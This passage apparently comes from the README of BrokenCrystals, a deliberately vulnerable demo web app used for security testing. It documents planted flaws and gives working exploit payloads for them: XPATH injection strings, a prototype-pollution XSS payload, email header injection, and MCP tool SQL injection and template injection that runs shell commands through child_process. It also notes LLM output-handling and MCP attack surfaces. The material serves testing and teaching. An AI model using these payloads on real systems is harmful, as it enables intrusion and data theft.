  - PUT to `/api/users/me` with `{ "password": "newpass", "isAdmin": true }` to overwrite sensitive fields for the authenticated user.

  </details>

- **JavaScript Vulnerabilities Scanning** - Index.html includes an older version of several javascript libraries.
  <details>
    <summary>Example of exploit</summary>
      ### List of URLs with Known Vulnerabilities

      ```text
      CVE-2020-11022 - https://brokencrystals.com/assets/vendor/jquery/jquery.min.js
      CVE-2020-11023 - https://brokencrystals.com/assets/vendor/jquery/jquery.min.js
      CVE-2024-6531 - https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.bundle.js
      CVE-2024-6531 - https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
      CVE-2024-6531 - https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.js
      CVE-2024-6531 - https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.min.js
      CVE-2025-26791 - https://brokencrystals.com/swagger/swagger-ui-bundle.js
      ```

      ### Finding Known Vulnerabilities with Retire.js

      Retire.js is a tool that helps identify known vulnerabilities in JavaScript libraries. Below is an example of using Retire.js to scan a downloaded JavaScript file for vulnerabilities:

      ```bash
      # Download the JavaScript file
      /app # curl https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.min.js -o bootstrap.min.js

      # Scan the file with Retire.js
      /app # retire --js bootstrap.min.js
      ```

      #### Output:
      ```
      ↳ bootstrap 4.1.0 has known vulnerabilities:
        - severity: medium; summary: XSS in collapse data-parent attribute; CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184
        - severity: medium; summary: XSS in data-container property of tooltip; CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
        - severity: medium; summary: XSS in data-target property of scrollspy; CVE: CVE-2018-14041; https://github.com/advisories/GHSA-pj7m-g53m-7638
        - severity: medium; summary: XSS in data-template, data-content, and data-title properties of tooltip/popover; CVE: CVE-2019-8331; https://github.com/advisories/GHSA-9v3m-8fp8-mj99
        - severity: medium; summary: Bootstrap Cross-Site Scripting (XSS) vulnerability; CVE: CVE-2024-6531; https://github.com/advisories/GHSA-vc8w-jr9v-vj7f
      ```

      This output highlights the vulnerabilities found in the specified JavaScript file, along with their severity, descriptions, and references for further details.

  </details>

- **AO1 Vertical access controls** - The page /dashboard can be reached despite the rights of user.
    <details>
      <summary>Example of bac.gif Demonstration</summary>

  To demonstrate the issue, you can refer to the following example:

  ![Example of bac.gif Demonstration](docs/bac.gif)

    </details>

- **Broken Function Level Authorization** - The endpoint DELETE `/users/one/:id/photo?isAdmin=` can be used to delete any user's profile photo by enumerating the user IDs and setting the `isAdmin` query parameter to true, as there is no validation of it's value on the server side.

- **IFrame Injection** - The `/marketplace` page a URL parameter `videosrc` which directly controls the src attribute of the IFrame at the bottom of this page. Similarly, the home page takes a URL param `maptitle` which directly controls the `title` attribute of the IFrame at the CONTACT section of this page.
  <details>
    <summary>IFrame Injection Example Exploitation</summary>

  ![IFrame Injection Demonstration](docs/iframe.gif)

  </details>

- **Excessive Data Exposure** - visiting the page `https://brokencrystals.com/adminpage` reveals a list of registered users, including their First Name, Last Name, Email, and Company. Observing the background traffic, a `GET /api/users/search/` request is made, and the response contains sensitive data such as `cardNumber` and `phoneNumber`.

  This response exposes sensitive information, such as credit card numbers and phone numbers, which should not be accessible through this endpoint.

  <details>
    <summary>Demo of Excessive Data Exposure</summary>

  ![Demo of Excessive Data Exposure](docs/excessive_data_exposure.gif)

  ```

  </details>

  ```

- **Business Constraint Bypass** - The `/api/products/latest` endpoint supports a `limit` parameter, which by default is set to 3. The `/api/products` endpoint is a password protected endpoint which returns all the products, yet if you change the `limit` param of `/api/products/latest` to be high enough you could get the same results without the need to be authenticated.
  <details>
    <summary>Example Exploitation of Business Constraint Bypass</summary>

  ```bash
  # Normal request that returns only 3 latest products
  curl https://brokencrystals.com/api/products/latest

  # Bypassing the constraint to get all products without authentication
  curl https://brokencrystals.com/api/products/latest?limit=1000
  ```

  </details>

- **ID Enumeration** - There are a few ID Enumeration vulnerabilities:

  1. The endpoint DELETE `/users/one/:id/photo?isAdmin=` which is used to delete a user's profile picture is vulnerable to ID Enumeration together with [Broken Function Level Authorization](#broken-function-level-authorization).
  2. The `/users/id/:id` endpoint returns user info by ID, it doesn't require neither authentication nor authorization.

- **XPATH Injection** - The `/api/partners/*` endpoint contains the following XPATH injection vulnerabilities:

  1. The endpoint GET `/api/partners/partnerLogin` is supposed to log in with the user's credentials in order to obtain account info. It's vulnerable to an XPATH injection using boolean based payloads. When exploited it'll retrieve data about other users as well. You can use `' or '1'='1` in the password field to exploit the EP.
  2. The endpoint GET `/api/partners/searchPartners` is supposed to search partners' names by a given keyword. It's vulnerable to an XPATH injection using string detection payloads. When exploited, it can grant access to sensitive information like passwords and even lead to full data leak. You can use `')] | //password%00//` or `')] | //* | a[('` to exploit the EP.
  3. The endpoint GET `/api/partners/query` is a raw XPATH injection endpoint. You can put whatever you like there. It is not referenced in the frontend, but it is an exposed API endpoint.
  4. Note: All endpoints are vulnerable to error based payloads.

  <details>
    <summary>Example Exploitation of XPATH Injection</summary>

  To demonstrate an XPATH injection attack, you can use the following `curl` command:

  ```bash
  $ curl "https://brokencrystals.com/api/partners/partnerLogin?user=anyuser&password=%27%20or%20%271%27%3D%271"
  ```

  Response:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <root>
    <name>Walter White</name>
    <age>50</age>
    <profession>Chemistry Teacher</profession>
    <residency country="US" state="New Mexico" city="Albuquerque"/>
    <username>walter100</username>
    <password>Heisenberg123</password>
    <wealth>15M USD</wealth>
    <name>Jesse Pinkman</name>
    <age>25</age>
    <profession>Professional Product Distributer</profession>
    <residency country="US" state="New Mexico" city="Yo Moma"/>
    <username>dapinkman69</username>
    <password>Yoyo1!</password>
    <wealth>5M USD</wealth>
    <name>Michael Ehrmantraut</name>
    <age>65</age>
    <profession>Personal Security Agent</profession>
    <residency country="US" state="New Mexico" city="Albuquerque"/>
    <username>_safetyman_</username>
    <password>LittleKid777</password>
    <wealth>50M USD</wealth>
    <name>Gus Fring</name>
    <age>52</age>
    <profession>Restaurant Chain Owner</profession>
    <residency country="US" state="New Mexico" city="Albuquerque"/>
    <username>ChickMan</username>
    <password>GoodChicken4U</password>
    <wealth>Too much USD</wealth>
  </root>
  ```

  </details>

- **Prototype Pollution** - The `/marketplace` endpoint is vulnerable to prototype pollution using the following methods:

  1. The EP GET `/marketplace?__proto__[Test]=Test` represents the client side vulnerability, by parsing the URI (for portfolio filtering) and converting
     its parameters into an object. This means that a requests like `/marketplace?__proto__[TestKey]=TestValue` will lead to a creation of `Object.TestKey`.
     One can test if an attack was successful by viewing the new property created in the console.
     This EP also supports prototype pollution based DOM XSS using a payload such as `__proto__[prototypePollutionDomXss]=data:,alert(1);`.
     The "legitimate" code tries to use the `prototypePollutionDomXss` parameter as a source for a script tag, so if the exploit is not used via this key it won't work.
  2. The EP GET `/api/email/sendSupportEmail` represents the server side vulnerability, by having a rookie URI parsing mistake (similar to the client side).
     This means that a request such as `/api/email/sendSupportEmail?name=Bob%20Dylan&__proto__[status]=222&to=username%40email.com&subject=Help%20Request&content=Help%20me..`
     will lead to a creation of `uriParams.status`, which is a parameter used in the final JSON response.

- **Date Manipulation** - The `/api/products?date_from={df}&date_to={dt}` endpoint fetches all products that were created between the selected dates. There is no limit on the range of dates and when a user tries to query a range larger than 2 years querying takes a significant amount of time. This EP is used by the frontend in the `/marketplace` page.
  <details>
    <summary>Example Exploitation of Date Manipulation</summary>

  To demonstrate the issue, you can use the following `curl` commands:

  1. **Querying a Short Date Range**:

     ```bash
     time curl 'https://brokencrystals.com/api/products?date_from=11-04-2024&date_to=12-04-2025' \
     -H 'authorization: YOUR_AUTH_HEADER'
     ```

     Response:

     ```json
     [
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Opal",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/opal.jpg&type=image/jpg",
         "description": "the precious stone",
         "viewsCount": 82,
         "id": 3
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Ruby",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/ruby.jpg&type=image/jpg",
         "description": "an intense heart crystal",
         "viewsCount": 141,
         "id": 2
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Shattuckite",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/shattuckite.jpg&type=image/jpg",
         "description": "mistery",
         "viewsCount": 1310,
         "id": 7
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Amber",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/amber.jpg&type=image/jpg",
         "description": "fossilized tree resin",
         "viewsCount": 98,
         "id": 5
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Sapphire",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/sapphire.jpg&type=image/jpg",
         "description": "",
         "viewsCount": 68,
         "id": 4
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Emerald",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/emerald.jpg&type=image/jpg",
         "description": "symbol of fertility and life",
         "viewsCount": 206,
         "id": 6
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Amethyst",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/amethyst.jpg&type=image/jpg",
         "description": "a violet variety of quartz",
         "viewsCount": 1359,
         "id": 1
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Bismuth",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/bismuth.jpg&type=image/jpg",
         "description": "rainbow",
         "viewsCount": 1254,
         "id": 8
       }
     ]
     ```

     Execution Time: `0.652s`

  2. **Querying a Long Date Range**:

     ```bash
     time curl 'https://brokencrystals.com/api/products?date_from=11-04-2000&date_to=12-04-2025' \
     -H 'authorization: YOUR_AUTH_HEADER'
     ```

     Response:

     ```json
     [
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Bismuth",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/bismuth.jpg&type=image/jpg",
         "description": "rainbow",
         "viewsCount": 1254,
         "id": 8
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Sapphire",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/sapphire.jpg&type=image/jpg",
         "description": "",
         "viewsCount": 68,
         "id": 4
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Emerald",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/emerald.jpg&type=image/jpg",
         "description": "symbol of fertility and life",
         "viewsCount": 206,
         "id": 6
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Amethyst",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/amethyst.jpg&type=image/jpg",
         "description": "a violet variety of quartz",
         "viewsCount": 1359,
         "id": 1
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Opal",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/opal.jpg&type=image/jpg",
         "description": "the precious stone",
         "viewsCount": 82,
         "id": 3
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Ruby",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/ruby.jpg&type=image/jpg",
         "description": "an intense heart crystal",
         "viewsCount": 141,
         "id": 2
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Shattuckite",
         "category": "Jewellery",
         "photoUrl": "/api/file?path=config/products/crystals/shattuckite.jpg&type=image/jpg",
         "description": "mistery",
         "viewsCount": 1310,
         "id": 7
       },
       {
         "createdAt": "2025-04-11T07:47:25.000Z",
         "name": "Amber",
         "category": "Healing",
         "photoUrl": "/api/file?path=config/products/crystals/amber.jpg&type=image/jpg",
         "description": "fossilized tree resin",
         "viewsCount": 98,
         "id": 5
       },
       {
         "createdAt": "2023-12-10T12:00:00.000Z",
         "name": "Axinite",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/axinite.jpg&type=image/jpg",
         "description": "brown",
         "viewsCount": 0,
         "id": 10
       },
       {
         "createdAt": "2020-11-18T12:00:00.000Z",
         "name": "Pietersite",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/pietersite.jpg&type=image/jpg",
         "description": "blue",
         "viewsCount": 0,
         "id": 11
       },
       {
         "createdAt": "2005-01-10T12:00:00.000Z",
         "name": "Labradorite",
         "category": "Gemstones",
         "photoUrl": "/api/file?path=config/products/crystals/labradorite.jpg&type=image/jpg",
         "description": "rainbow",
         "viewsCount": 0,
         "id": 9
       }
     ]
     ```

     Execution Time: `2.647s`

</details>
- **Email Injection** - The `/api/email/sendSupportEmail` is vulnerable to email injection by supplying tempered recipients.
  To exploit the EP you can dispatch a request as such `/api/email/sendSupportEmail?name=Bob&to=username%40email.com%0aCc:%20bob@domain.com&subject=Help%20Request&content=I%20would%20like%20to%20request%20help%20regarding`.
  This will lead to the sending of a mail to both `username@email.com` and `bob@domain.com` (as the Cc).
  Note: This EP is also vulnerable to `Server side prototype pollution`, as mentioned in this README.

- **Insecure Output Handling** - The `/chat` route is vulnerable to insecure output handling, where the LLM response is not properly sanitized before being rendered. This can lead to the execution of malicious scripts if the response contains unsanitized HTML or JavaScript.

  <details>
    <summary>Insecure Output Handling Example</summary>

  ![Insecure Output Handling Demonstration](docs/insecure_output_handling.gif)

  </details>

- **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools:

  - **SQL Injection via count_tool** - The `count_tool` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
  - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
  - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
  - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:

    - MCP sessions are independent from the regular API authentication/authorization flow.
    - `initialize` must be called first to establish an MCP session.
    - `initialize` returns `Mcp-Session-Id`.
    - Every non-initialize MCP request requires an active MCP session.
    - Every non-initialize MCP request must send the same `Mcp-Session-Id` received from `initialize`.
    - Missing `Mcp-Session-Id` on non-initialize requests returns HTTP `400`.
    - Unknown/expired/terminated `Mcp-Session-Id` returns HTTP `404`.
    - Clients can explicitly terminate sessions with `DELETE /api/mcp` + `Mcp-Session-Id`.
    - `MCP_SESSION_TTL_MS` (default: `1800000`)
    - `initialize` works in both unauthenticated and authenticated flows.
    - If `Authorization: Bearer <jwt>` is provided to `initialize`, the MCP session is marked authenticated.
    - MCP permissions are role-based using the same user model as the HTTP server (`admin` vs regular user).
    - Some tools require authenticated MCP sessions, while others are available without authentication.
    - `config_tool` is admin-only.

  - **MCP Tool List (Quick Reference)**:

    _Initialize guest MCP session (required for all non-`initialize` MCP calls):_

    ```bash
    BASE='https://brokencrystals.com'
    INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
      -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
    MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
    ```

    1. `count_tool` (public)  
       Vulnerability: **SQL Injection**.  
       Example:

       ```bash
       curl "${BASE}/api/mcp" -X POST \
         -H 'Content-Type: application/json' \
         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
         -d '{
           "jsonrpc": "2.0",
           "method": "tools/call",
           "params": {
             "name": "count_tool",
             "arguments": {
               "query": "select count(*) as count from testimonial"
             }
           },
           "id": 2
         }'
       ```

    2. `render_tool` (public)  
       Vulnerability: **Server-Side Template Injection (SSTI)** via user-controlled doT template.  
       Example:

       ```bash
       curl "${BASE}/api/mcp" -X POST \
         -H 'Content-Type: application/json' \
         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
         -d '{
           "jsonrpc": "2.0",
           "method": "tools/call",
           "params": {
             "name": "render_tool",
             "arguments": {
               "numbers": [1],
               "template": "The node version is: {{=process.version}}"
             }
           },
           "id": 3
         }'
       ```

    3. `config_tool` (admin only)  
       Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
       Example (admin-authenticated MCP session):

       ```bash
       AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
         -H 'Content-Type: application/json' \
         -d '{"user":"admin","password":"admin","op":"basic"}')
       ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')

       ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
         -H 'Content-Type: application/json' \
         -H "Authorization: ${ADMIN_AUTH}" \
         -d '{"jsonrpc":"2.0","method":"initialize","id":4}')
       ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')

       curl "${BASE}/api/mcp" -X POST \
         -H 'Content-Type: application/json' \
         -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
         -d '{
           "jsonrpc": "2.0",
           "method": "tools/call",
           "params": {
             "name": "config_tool",
             "arguments": {
               "include_sensitive": true
             }
           },
           "id": 5
         }'
       ```

  <details>
    <summary>MCP Vulnerabilities Example Exploitation</summary>

  _Note: Always call `initialize` first. After that, send `Mcp-Session-Id` on every MCP request. Authenticated and unauthenticated sessions are both supported._

  1. **Initialize MCP session and list tools**:

  ```bash
  BASE='https://brokencrystals.com'
  INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
  MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')

  curl "${BASE}/api/mcp" -X POST \
    -H 'Content-Type: application/json' \
    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
    -d '{"jsonrpc":"2.0","method":"tools/list","id":2}'
  ```

  2. **SQL Injection via count_tool**:

     ```bash
     curl "${BASE}/api/mcp" -X POST \
       -H 'Content-Type: application/json' \
       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
       -d '{
         "jsonrpc": "2.0",
         "method": "tools/call",
         "params": {
           "name": "count_tool",
           "arguments": {
             "query": "select count(table_name) as count from information_schema.tables"
           }
         },
         "id": 2
       }'
     ```

     Response:

     ```json
     {
       "jsonrpc": "2.0",
       "result": {
         "content": [{ "type": "text", "text": "Query result: 214" }]
       },
       "id": 2
     }
     ```

  3. **Sensitive Data Exposure via config_tool** (admin-authenticated MCP session):

     ```bash
     AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
       -H 'Content-Type: application/json' \
       -d '{"user":"admin","password":"admin","op":"basic"}')
     ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')

     ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
       -H 'Content-Type: application/json' \
       -H "Authorization: ${ADMIN_AUTH}" \
       -d '{"jsonrpc":"2.0","method":"initialize","id":3}')
     ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')

     curl "${BASE}/api/mcp" -X POST \
       -H 'Content-Type: application/json' \
       -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
       -d '{
         "jsonrpc": "2.0",
         "method": "tools/call",
         "params": {
           "name": "config_tool",
            "arguments": {}
          },
         "id": 4
       }'
     ```

     Response:

     ```json
     {
       "jsonrpc": "2.0",
       "result": {
         "content": [
           {
             "type": "text",
             "text": "{\n  \"awsBucket\": \"https://neuralegion-open-bucket.s3.amazonaws.com\",\n  \"sql\": \"postgres://bc:bc@db:5432/bc\",\n  \"googlemaps\": \"AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ\"\n}"
           }
         ]
       },
       "id": 4
     }
     ```

  4. **Server-Side Template Injection via render_tool**:

     ```bash
     curl "${BASE}/api/mcp" -X POST \
       -H 'Content-Type: application/json' \
       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
       -d '{
         "jsonrpc": "2.0",
         "method": "tools/call",
         "params": {
           "name": "render_tool",
           "arguments": {
             "numbers": [1],
             "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
           }
         },
         "id": 5
       }'
     ```

     This payload executes arbitrary system commands through the template injection vulnerability.

  </details>
